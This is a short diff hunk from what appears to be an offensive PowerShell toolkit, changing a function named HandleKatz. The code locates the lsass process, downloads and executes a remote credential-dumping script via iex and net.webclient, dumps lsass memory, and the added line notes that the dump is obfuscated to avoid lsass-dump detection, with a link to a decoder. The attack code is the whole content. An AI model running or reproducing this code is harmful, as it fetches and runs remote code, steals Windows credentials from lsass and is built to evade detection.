@@ -713,7 +713,10 @@ function HandleKatz
       $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
       
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
+      
       Invoke-HandleKatz -handProcID $dumpid
+      
+      Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
     }
     else{Write-Host "No Admin rights, start again using a privileged session!"}
 }
